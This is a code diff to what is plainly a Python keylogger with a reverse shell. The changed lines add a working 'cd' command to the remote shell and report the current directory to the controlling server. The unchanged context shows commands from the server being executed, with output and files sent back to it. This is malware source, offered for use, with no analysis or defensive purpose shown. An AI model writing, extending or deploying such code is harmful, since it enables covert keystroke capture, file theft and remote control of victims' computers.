@@ -280,6 +280,9 @@ if __name__ == "__main__":
                 if recv == "exit":
                     reverse_shell_active = False
                     keylogger.send_message_to_server("reverse shell deactivated")
+                elif recv.startswith("cd") and len(recv) > 2:
+                    os.chdir(recv[2:].strip())
+                    keylogger.send_message_to_server("current dir"+os.getcwd())
                 else:
                     data = execute_command(recv)
                     keylogger.send_message_to_server(data)
@@ -295,7 +298,7 @@ if __name__ == "__main__":
                     keylogger.send_files_to_server(files)
                 elif recv == "shell":
                     reverse_shell_active = True
-                    keylogger.send_message_to_server("reverse shell activated")
+                    keylogger.send_message_to_server("current dir"+os.getcwd())
                 elif recv == "stop":
                     keylogger.send_message_to_server("keylogger stopped")
                     keylogger.stop()
